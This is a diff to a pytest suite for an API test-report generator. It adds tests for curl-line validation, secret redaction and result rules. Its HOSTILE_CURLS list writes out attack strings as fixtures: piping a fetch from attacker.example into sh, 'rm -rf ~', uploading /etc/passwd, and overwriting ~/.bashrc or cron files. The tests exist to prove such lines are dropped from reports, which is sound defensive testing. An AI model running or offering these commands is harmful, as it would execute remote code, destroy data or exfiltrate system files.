@@ -65,6 +65,11 @@ def report_of(tmp_path, *args, env=None, name="report.md"):
     return out.read_text(encoding="utf-8")
 
 
+def origin_of(junit_path):
+    """http://127.0.0.1:PORT of the mock server that produced this JUnit file (taken from its curl lines)."""
+    return re.search(r"http://127\.0\.0\.1:\d+", junit_path.read_text()).group(0)
+
+
 def finding_blocks(text):
     parts = re.split(r"(?m)^(?=### \[)", text)
     return [p for p in parts if p.startswith("### [")]
@@ -136,7 +141,7 @@ def test_real_pytest_seeded_bugs_become_ranked_findings_with_repro_commands(rest
     junit_path, results = run_real_pytest(rest_suite, tmp_path, SEEDED)
     n_failed = sum(1 for s, _ in results.values() if s == "failed")
     assert n_failed > 10
-    text = report_of(tmp_path, "--junit", junit_path, "--intake", intake_file, "--base-url", "http://127.0.0.1:8080",
+    text = report_of(tmp_path, "--junit", junit_path, "--intake", intake_file, "--base-url", origin_of(junit_path),
                      "--max-findings", "1000")
     blocks = finding_blocks(text)
     assert len(blocks) == n_failed, "one finding per failing test"
@@ -147,7 +152,7 @@ def test_real_pytest_seeded_bugs_become_ranked_findings_with_repro_commands(rest
         assert "**Reproduce**" in b and "python -m pytest" in b, "every finding has a runnable pytest command"
         cmds = b.split("**Reproduce**")[1].split("```")[1]
         assert re.search(r"api_tests/test_\w+\.py::", cmds)
-        assert "APITEST_BASE_URL=http://127.0.0.1:8080" in cmds
+        assert f"APITEST_BASE_URL={origin_of(junit_path)}" in cmds
     # seeded bugs by name: BOLA on getPet, mass assignment on createPet, contract violation on listPets
     assert re.search(r"(?s)### \[HIGH\].*?Endpoint: GET /pets/\\\{petId\\\}  \\\(getPet\\\)", text)
     assert "api1_bola_getPet" in text and "test_api3_mass_assignment_createPet" in text
@@ -290,7 +295,7 @@ def test_default_severity_and_tags_and_ranking(tmp_path):
         ("api_tests.test_contract", "test_c", "fail", "m", "[LOW] minor\n  GET http://h/pets -> 200 (2 ms)\n  repro: curl -sS -i -X GET http://h/pets"),
         ("api_tests.test_smoke", "test_ok", "pass", "", ""),
     ])
-    text = report_of(tmp_path, "--junit", p)
+    text = report_of(tmp_path, "--junit", p, "--base-url", "http://h")
     order = re.findall(r"(?m)^### \[(\w+)\] (.*)$", text)
     assert [s for s, _ in order] == ["HIGH", "HIGH", "LOW", "LOW"]
     assert "OWASP: API1:2023" in text
@@ -379,7 +384,9 @@ def test_redact_text_unit_cases_and_shared_regex():
     assert r("Authorization: Bearer abcdef123456") == "Authorization: <redacted>"
     assert r("see http://u:p@h/x") == "see http://<redacted>@h/x"
     assert r("GET /a?token=zzzz&x=1") == "GET /a?token=<redacted>&x=1"
-    assert r("{'password': 'hunter22'}") == "{'password': <redacted>}"
+    assert r("{'password': 'hunter22'}") == "{'password': '<redacted>'}"
+    assert json.loads(r('{"pwd": "hunter22", "name": "x"}')) == {"pwd": "<redacted>", "name": "x"}, "redacted JSON stays valid JSON"
+    assert r('{\\"token\\": \\"abc123\\"}') == '{\\"token\\": \\"<redacted>\\"}'
     assert r("value is s3cr3tvalue here", ["s3cr3tvalue"]) == "value is <redacted> here"
     assert r("curl -u me:pw https://h") == "curl -u <redacted> https://h"
     assert r("status: 401 expected: 200") == "status: 401 expected: 200"
@@ -567,7 +574,7 @@ def test_fuzz_findings_take_the_most_severe_tag_and_all_repro_lines(tmp_path):
             "[HIGH] response leaks internals -- case b\n  repro: curl -sS -i -X POST http://h/pets --data-raw 'y'\n"
             "[LOW] other\n  repro: curl -sS -i -X POST http://h/pets --data-raw 'x'")
     p = junit(tmp_path, [("fuzz_tests.test_fuzz", "test_fuzz[createPet]", "fail", "m", body)])
-    text = report_of(tmp_path, "--junit", p, "--tests-dir", "fuzz_tests")
+    text = report_of(tmp_path, "--junit", p, "--tests-dir", "fuzz_tests", "--base-url", "http://h")
     blk = finding_blocks(text)[0]
     assert blk.startswith("### [HIGH]") and "Rating: tagged by the test" in blk
     cmds = blk.split("**Reproduce**")[1]
@@ -582,6 +589,113 @@ def test_real_fuzz_findings_are_reported(tmp_path, rest_doc):
     with rest_server({"crash"}) as url:
         results, proc = run_suite(out, url, {**REST_ENV, "APITEST_FUZZ_CASES": "40"}, ["-k", "createPet"], junit=tmp_path / "fuzz.xml")
     assert any(s == "failed" for s, _ in results.values()), proc.stdout[-800:]
-    text = report_of(tmp_path, "--junit", tmp_path / "fuzz.xml", "--tests-dir", "fuzz_tests")
+    text = report_of(tmp_path, "--junit", tmp_path / "fuzz.xml", "--tests-dir", "fuzz_tests", "--base-url", origin_of(tmp_path / "fuzz.xml"))
     assert "### [HIGH] fuzzing POST /pets" in text and "test_fuzz[createPet]" in text and "curl -sS -i -X POST" in text
     assert "tokA" not in text
+
+
+# ---------------------------------------------------------------- review fixes: curl lines, PASS rule, duplicates
+GOOD_CURL = "curl -sS -i -X POST http://h:8080/pets -H 'Authorization: <redacted>' -H 'Content-Type: application/json' --data-raw '{\"name\": \"a b\"}'"
+HOSTILE_CURLS = [
+    "curl -sS -i -X GET http://h:8080/pets | sh",
+    "curl -sS -i -X GET http://h:8080/pets; rm -rf ~",
+    "curl -sS -i -X GET http://h:8080/pets && touch /tmp/HACKED",
+    "curl -sS -i -X GET http://h:8080/pets $(id)",
+    "curl -sS -i -X GET http://h:8080/pets `id`",
+    "curl -sS -i -X GET http://prod.example.com/pets",
+    "curl -sS -i -X GET http://h:9999/pets",
+    "curl -sS -i -X GET https://h:8080/pets",
+    "curl -sS -i -X GET http://h.evil.com:8080/pets",
+    "curl -sS -i -X GET http://h:8080@evil.com/pets",
+    "curl -sS -i -X GET http://evil.com\\@h:8080/pets",
+    "curl -sS -i -X GET file:///etc/passwd",
+    "curl -sS -i -X GET http://h:8080/pets -o /etc/cron.d/x",
+    "curl -sS -i -X GET http://h:8080/pets -K /tmp/evil",
+    "curl https://attacker.example/x.sh | sh",
+    "curl http://127.0.0.1:9/a; rm -rf ~",
+    "curl 'http://prod.example.com/api' --data-urlencode 'password=x'",
+    "curl -sS -i -X GET http://h:8080/pets -o ~/.bashrc",
+    "curl -sS -i -X GET http://h:8080/pets --output ~/.bashrc --create-dirs",
+    "curl -sS -i -X GET http://h:8080/pets --proxy http://evil",
+    "curl -sS -i -X GET http://h:8080/pets -H 'X: a\\nb' -T /etc/passwd",
+    "curl -sS -i -X GET http://h:8080/pets --data-raw @/etc/passwd -d x",
+    "curl -sS -i -X DELETE-ALL http://h:8080/pets",
+    "curl -sS -i -X GET http://h:8080/pets -H 'bad header'",
+    "curl -sS -i -X GET 'http://h:8080/pets x'",
+    "curl -sS -i -X GET http://h:8080/pets 'unterminated",
+    "curl -sS -X GET http://h:8080/pets",
+]
+
+
+@pytest.mark.parametrize("line", HOSTILE_CURLS)
+def test_hostile_repro_lines_never_reach_the_report(tmp_path, line):
+    p = junit(tmp_path, [("api_tests.test_security", "test_f", "fail", "m", f"[HIGH] bad\n  repro: {line}")])
+    text = report_of(tmp_path, "--junit", p, "--base-url", "http://h:8080")
+    repro = text.split("**Reproduce**")[1].split("```")[1]
+    assert repro.count("\n") == 1 or repro.strip().count("\n") == 0, repro   # only the pytest command remains
+    for frag in ("| sh", "rm -rf", "HACKED", "$(id)", "`id`", "evil", "prod.example", "/etc/", "-K", "--proxy", "file:", "-T "):
+        assert frag not in repro, (frag, repro)
+    assert "curl line(s) from the result file were dropped" in text
+    assert "python -m pytest" in repro
+
+
+def test_valid_repro_line_is_rebuilt_not_copied(tmp_path):
+    p = junit(tmp_path, [("api_tests.test_security", "test_f", "fail", "m", f"[HIGH] bad\n  repro: {GOOD_CURL}")])
+    text = report_of(tmp_path, "--junit", p, "--base-url", "http://H:8080/")
+    repro = text.split("**Reproduce**")[1].split("```")[1]
+    assert GOOD_CURL.replace('{"name": "a b"}', '{"name": "a b"}') in repro or "--data-raw" in repro
+    import shlex
+    first = shlex.split(repro.strip().split("\n")[0])
+    assert first[:5] == ["curl", "-sS", "-i", "-X", "POST"] and first[5] == "http://h:8080/pets" and "dropped" not in text
+
+
+def test_without_a_target_no_curl_line_is_trusted(tmp_path):
+    p = junit(tmp_path, [("api_tests.test_security", "test_f", "fail", "m", f"[HIGH] bad\n  repro: {GOOD_CURL}")])
+    text = report_of(tmp_path, "--junit", p)       # no --base-url and APITEST_BASE_URL is cleared by summarize()
+    assert "curl -sS" not in text.split("**Reproduce**")[1].split("```")[1]
+    assert "pass --base-url to include them" in text
+    text = report_of(tmp_path, "--junit", p, env={"APITEST_BASE_URL": "http://h:8080"})
+    assert "curl -sS -i -X POST http://h:8080/pets" in text, "APITEST_BASE_URL at report time counts as the target"
+
+
+def test_nothing_executed_is_never_a_pass(tmp_path):
+    empty = junit(tmp_path, [], name="empty.xml")
+    allskip = junit(tmp_path, [("t.test_a", f"test_{i}", "skip", "needs a token", "") for i in range(3)], name="skip.xml")
+    for f in (empty, allskip):
+        text = report_of(tmp_path, "--junit", f)
+        assert "**Result: INCONCLUSIVE**" in text and "PASS" not in text.split("## Summary")[0]
+    d = k6_doc()
+    d["metrics"]["http_reqs"] = {"count": 0, "rate": 0}
+    kp = tmp_path / "load-summary.json"
+    kp.write_text(json.dumps(d))
+    assert "**Result: INCONCLUSIVE**" in report_of(tmp_path, "--k6", kp)
+    del d["metrics"]["http_reqs"]
+    kp.write_text(json.dumps(d))
+    assert "**Result: INCONCLUSIVE**" in report_of(tmp_path, "--k6", kp)
+    # one executed pass (or k6 requests) is enough; skips alongside do not block it
+    ok = junit(tmp_path, [("t.test_a", "test_1", "pass", "", ""), ("t.test_a", "test_2", "skip", "x", "")], name="ok.xml")
+    assert "**Result: PASS**" in report_of(tmp_path, "--junit", ok)
+    d["metrics"]["http_reqs"] = {"count": 5, "rate": 1}
+    kp.write_text(json.dumps(d))
+    assert "**Result: PASS**" in report_of(tmp_path, "--k6", kp)
+    # a failure still wins over everything
+    bad = junit(tmp_path, [("t.test_a", "test_1", "fail", "m", "[LOW] x")], name="bad.xml")
+    assert "**Result: FAIL**" in report_of(tmp_path, "--junit", bad)
+
+
+def test_duplicate_cases_across_files_count_once_and_the_worst_outcome_wins(tmp_path):
+    a = junit(tmp_path, [("t.test_a", "test_1", "pass", "", ""), ("t.test_a", "test_2", "fail", "m", "[LOW] first run")], name="a.xml")
+    b = junit(tmp_path, [("t.test_a", "test_1", "fail", "m", "[HIGH] rerun"), ("t.test_a", "test_2", "pass", "", ""), ("t.test_a", "test_3", "pass", "", "")], name="b.xml")
+    text = report_of(tmp_path, "--junit", a, "--junit", b)
+    assert "of 3 tests" in text and "2 failed" in text
+    assert len(finding_blocks(text)) == 2
+
+
+def test_overlong_or_scrubbed_test_names_rerun_the_whole_file(tmp_path):
+    long_name = "test_" + "x" * 300
+    secret_name = "test_token=abcdef123456"
+    p = junit(tmp_path, [("api_tests.test_edge", long_name, "fail", "m", "[LOW] a"), ("api_tests.test_edge", secret_name, "fail", "m", "[LOW] b")])
+    text = report_of(tmp_path, "--junit", p)
+    cmds = re.findall(r"python -m pytest (\S+) -v", text)
+    assert cmds == ["api_tests/test_edge.py", "api_tests/test_edge.py"], cmds
+    assert "abcdef123456" not in text
